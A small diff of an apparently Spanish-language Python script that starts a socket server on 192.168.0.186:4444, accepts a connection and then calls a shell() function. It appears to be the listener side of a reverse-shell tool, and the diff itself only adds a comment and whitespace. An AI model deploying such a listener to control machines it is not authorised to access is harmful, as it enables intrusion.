@@ -71,10 +71,10 @@ def levantar_servidor(ip, puerto):
     
     print("[+] Servidor activo")
     
-    objetivo, ip = servidor.accept()
+    objetivo, ip = servidor.accept() 
     print("[+] Conectado :" + ip[0])
     
-levantar_servidor("192.168.0.186",4444)
+levantar_servidor("192.168.0.186",4444) #ip servidor y puerto
 shell()
 servidor.close()
     
